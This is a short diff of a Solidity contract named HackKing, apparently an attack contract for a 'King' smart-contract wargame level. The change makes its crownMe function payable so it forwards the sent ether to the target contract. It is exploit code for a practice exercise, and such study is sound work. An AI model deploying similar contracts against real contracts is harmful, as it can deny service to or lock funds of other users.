@@ -8,8 +8,8 @@ contract HackKing {
     kingContract = _kingContract;
   }
 
-  function crownMe(uint _amount) public {
-    (bool success, ) = kingContract.call.value(_amount)("");
+  function crownMe() public payable {
+    (bool success, bytes memory data) = kingContract.call.value(msg.value)("");
     require(success, "Transfer failed.");
   }
 
